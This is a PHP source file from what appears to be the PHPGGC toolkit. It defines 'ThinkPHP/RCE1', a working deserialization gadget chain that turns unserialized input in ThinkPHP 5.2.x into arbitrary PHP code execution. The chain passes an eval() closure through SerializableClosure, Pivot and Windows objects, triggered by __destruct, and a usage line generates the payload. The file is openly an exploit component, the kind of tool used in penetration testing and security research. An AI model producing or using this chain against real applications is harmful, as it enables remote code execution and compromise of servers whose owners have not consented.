<?php
/**
 * Created by PhpStorm.
 * User: wh1t3P1g
 * Date: 2018/8/24
 * Time: 13:38
 */

namespace GadgetChain\ThinkPHP;


class RCE1 extends \PHPGGC\GadgetChain\RCE
{
    public $version = '5.2.x';
    public $vector = '__destruct';
    public $author = 'wh1t3p1g';
    public $informations = '
    	This chain is supposed to execute arbitrary php code
    	需要使用编码器，不可直接输出
    	./phpggc -u ThinkPHP/RCE1 "phpinfo();"
    ';

    public function generate(array $parameters)
    {
        $code = $parameters['code'];
        $func = function () use ($code) {eval($code);};
        $closure = new \Opis\Closure\SerializableClosure($func);
        $pivot = new \think\model\Pivot($closure);
        $windows = new \think\process\pipes\Windows([$pivot]);
        return $windows;
    }
}